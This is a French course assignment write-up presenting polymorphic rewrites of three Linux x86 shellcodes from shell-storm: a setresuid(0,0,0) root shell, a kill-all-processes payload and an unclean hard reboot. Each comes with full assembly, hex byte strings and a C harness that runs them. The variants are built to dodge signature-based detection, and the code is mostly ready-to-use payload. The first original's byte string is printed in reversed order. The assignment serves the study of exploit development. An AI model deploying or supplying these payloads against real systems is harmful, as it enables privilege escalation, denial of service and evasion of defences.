# Assignement 6 #

Dans cette section, il est demandé de proposer une version polymorphique de 3 shellcodes issus de la plateforme shellstorm.
 - http://shell-storm.org/shellcode/files/shellcode-220.php
 - http://shell-storm.org/shellcode/files/shellcode-212.php
 - http://shell-storm.org/shellcode/files/shellcode-639.php


## Première modification ##

Source : http://shell-storm.org/shellcode/files/shellcode-220.php

```c
{==========================================================}
{ linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes    }
{==========================================================}
--[code]--
BITS 32
 
;setresuid(0,0,0)
xor eax, eax
xor ebx, ebx
xor ecx, ecx
cdq
mov BYTE al, 0xa4
int 0x80
 
;execve("/bin//sh", ["/bin//sh", NULL], [NULL])
push BYTE 11
pop eax
push ecx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push ecx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
--[/code]--
 
Shellcode string:
--[code]--
char shellcode [] =
"\x80\xcd\xe1\x89\x53\xe2\x89\x51\xe3\x89\x6e\x69\x62\x2f\x68\x68\x73\x2f\x2f\x68\x51\x58\x0b\x6a\x80\xcd\xa4\xb0\x99\xc9\x31\xdb\x31\xc0\x31"
-[/code]-
 
# milw0rm.com [2008-09-29]
```
Version modifiée

```c

http://shell-storm.org/shellcode/files/shellcode-220.php
linux x86 setresuid(0,0,0)-/bin/sh shellcode 35 bytes
Polymorphic version 36 bytes
Author : Alain Menelet

global _start

section .text

_start:

    ;setresuid(0,0,0)

    xor ecx, ecx
    mul ecx
    mov ebx, ecx
    cdq
    mov al, 0xa4
    int 0x80

    ;execve("/bin//sh", ["/bin//sh", NULL], [NULL])

    mul ecx
    push ecx
    push 0x68732f2f
    push 0x6e69622f
    mov ebx, esp
    push ecx
    mov edx, esp
    push ebx
    mov ecx, esp
    mov al, 0xb
    int 0x80

"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"

xophidia@xophidia-VirtualBox:~/Documents/Shellcode/as6$ ./test_shellcode
taille 36
$ 
```

## Seconde modification ##

Source : http://shell-storm.org/shellcode/files/shellcode-212.php

```c
/* By Kris Katterjohn 11/13/2006
 *
 * 11 byte shellcode to kill all processes for Linux/x86
 *
 *
 *
 * section .text
 *
 *      global _start
 *
 * _start:
 *
 * ; kill(-1, SIGKILL)
 *
 *      push byte 37
 *      pop eax
 *      push byte -1
 *      pop ebx
 *      push byte 9
 *      pop ecx
 *      int 0x80
 */

main()
{
       char shellcode[] = "\x6a\x25\x58\x6a\xff\x5b\x6a\x09\x59\xcd\x80";

       (*(void (*)()) shellcode)();
}
```

```c
http://shell-storm.org/shellcode/files/shellcode-212.php
11 byte shellcode to kill all processes for Linux/x86
Polymorphic version 13 bytes
Author : Alain Menelet

global _start

section .text

_start:

    xor ecx, ecx
    mul ecx
    mov al, 0x25
    push byte -1
    pop ebx
    mov cl, 0x9
    int 0x80
```

Nous compilons le tout :

```c
Taille: 13
"\x31\xc9\xf7\xe1\xb0\x25\x6a\xff\x5b\xb1\x09\xcd\x80"
```

### Troisième version ###

Source : http://shell-storm.org/shellcode/files/shellcode-639.php

```c
/*
1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
0     _                   __           __       __                     1
1   /' \            __  /'__`\        /\ \__  /'__`\                   0
0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
1                  \ \____/ >> Exploit database separated by exploit   0
0                   \/___/          type (local, remote, DoS, etc.)    1
1                                                                      1
0  [+] Site            : Inj3ct0r.com                                  0
1  [+] Support e-mail  : submit[at]inj3ct0r.com                        1
0                                                                      0
0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
Title  : hard reboot (without any message) and data not lost shellcode
Name   : 33 bytes hard / unclean reboot but data not be lost x86 linux shellcode 
Date   : Thu Jun  3 12:54:55 2010
Author : gunslinger_ <yudha.gunslinger[at]gmail.com>
Web    : http://devilzc0de.org
blog   : http://gunslingerc0de.wordpress.com
tested on : linux ubuntu 9.04 , may cause fsck on reboot
special thanks to : r0073r (inj3ct0r.com), d3hydr8 (darkc0de.com), ty miller (projectshellcode.com), jonathan salwan(shell-storm.org), mywisdom (devilzc0de.org)
greetz to : flyff666, whitehat, ketek, chaer, peneter, and all devilzc0de crew
*/
#include <stdio.h>

char *shellcode=
		"\xb0\x24"                    /* mov    $0x24,%al */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x58"                    /* mov    $0x58,%al */
		"\xbb\xad\xde\xe1\xfe"        /* mov    $0xfee1dead,%ebx */
		"\xb9\x69\x19\x12\x28"        /* mov    $0x28121969,%ecx */
		"\xba\x67\x45\x23\x01"        /* mov    $0x1234567,%edx */
		"\xcd\x80"                    /* int    $0x80 */
		"\x31\xc0"                    /* xor    %eax,%eax */
		"\xb0\x01"                    /* mov    $0x1,%al */
		"\x31\xdb"                    /* xor    %ebx,%ebx */
		"\xcd\x80";                   /* int    $0x80 */

int main(void)
{
		fprintf(stdout,"Length: %d\n",strlen(shellcode));
		((void (*)(void)) shellcode)();
		return 0;
}

```

Code modifié:

```c
http://shell-storm.org/shellcode/files/shellcode-639.php
hard reboot (without any message) and data not lost - 33 bytes
Polymorphic version 39 bytes
Author : Alain Menelet

global _start
section .text

_start:
	push byte 0x24
	pop eax
	int 0x80
	push byte 0x58
	pop eax
	mov ebx, 0xfee1dead	; linux_reboot_magic1
	mov ecx, 0x15E0F657	; linux_reboot_magic2
    add ecx, 0x12312312 ; 
	mov edx, 0x1234567	; linux_reboot_cmd_restart
	int 0x80
	xor eax, eax
	mov al, 0x1
	xor ebx, ebx
	int 0x80

```

Une fois compilé, nous obtenons notre shellcode modifié :

```c
"\x6a\x24\x58\xcd\x80\x6a\x58\x58\xbb\xad\xde\xe1\xfe\xb9\x57\xf6\xe0\x15\x81\xc1\x12\x23\x31\x12\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";
```

Les 3 codes ont été testés à l'aide du programme ci-dessous :

```c
#include <stdio.h>
#include <string.h>


unsigned char code[] = \
"\x6a\x24\x58\xcd\x80\x6a\x58\x58\xbb\xad\xde\xe1\xfe\xb9\x57\xf6\xe0\x15\x81\xc1\x12\x23\x31\x12\xba\x67\x45\x23\x01\xcd\x80\x31\xc0\xb0\x01\x31\xdb\xcd\x80";

int main()
{

        printf("taille %d\n", strlen(code));

        int (*ret)() = (int(*)())code;

        ret();

        return 0;

}
```